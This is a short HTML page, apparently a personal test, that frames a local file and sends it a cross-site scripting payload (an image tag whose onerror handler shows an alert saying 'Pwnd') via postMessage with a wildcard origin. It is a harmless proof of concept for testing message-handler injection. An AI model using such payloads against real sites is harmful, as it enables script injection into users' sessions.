<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <iframe class="frame" src="file:///C:/Users/MOHAMED%20ABD%20ALHADY/Desktop/Untitled-1.html" frameborder="0"></iframe>
<script>

var frame = document.querySelector('.frame');

frame.contentWindow.postMessage("<img src=x onerror=alert('Pwnd')>","*");

</script>
</body>
</html>
